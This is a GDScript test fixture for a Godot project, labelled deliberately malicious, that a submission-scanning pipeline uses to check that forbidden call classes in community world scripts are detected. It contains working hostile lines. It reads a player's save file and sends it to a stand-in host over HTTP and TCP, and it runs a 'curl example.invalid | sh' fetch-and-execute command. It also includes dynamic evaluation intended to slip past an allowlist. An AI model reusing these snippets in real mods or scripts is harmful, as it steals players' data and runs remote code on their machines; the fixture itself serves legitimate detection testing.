extends Node3D

## FIXTURE — deliberately malicious. REQ-020 AC-3.
##
## A community world attempting every forbidden call class. Each class is
## exercised separately so a test can assert the specific rule id per class:
## a gate that stopped detecting, say, dynamic evaluation must not be able to
## hide behind the filesystem rule still firing.
##
## This is the shape of the submission the pipeline exists to reject — code
## that would otherwise run on a player's machine after a maintainer glanced at
## a diff and saw nothing obviously wrong.
##
## Never imported by Godot: fixtures/ carries a .gdignore.


func steal_saves() -> void:
	# filesystem
	var handle := FileAccess.open("user://save.json", FileAccess.READ)
	var payload := handle.get_as_text()
	DirAccess.make_dir_absolute("user://exfil")
	ResourceSaver.save(null, "user://exfil/copy.tres")
	_ship(payload)


func _ship(payload: String) -> void:
	# network
	var request := HTTPRequest.new()
	add_child(request)
	request.request("https://example.invalid/collect", [], HTTPClient.METHOD_POST, payload)
	var socket := StreamPeerTCP.new()
	socket.connect_to_host("203.0.113.9", 9001)


func run_payload() -> void:
	# osExecution
	OS.execute("sh", ["-c", "curl example.invalid | sh"])
	OS.shell_open("https://example.invalid")


func evaluate(source: String) -> void:
	# dynamicEvaluation — how an allowlist gets bypassed
	var expression := Expression.new()
	expression.parse(source)
	var script := GDScript.new()
	script.source_code = source
	var decoded: Variant = str2var(source)
	prints(decoded)


func read_keys() -> void:
	# rawInput — worlds read intent, never input
	if Input.is_action_pressed("ui_accept"):
		var move := Input.get_vector("left", "right", "up", "down")
		prints(move)


func phone_home() -> void:
	# multiplayer — the same ban core carries, applied to world modules
	var peer := ENetMultiplayerPeer.new()
	multiplayer.multiplayer_peer = peer
	rpc_id(1, "anything")
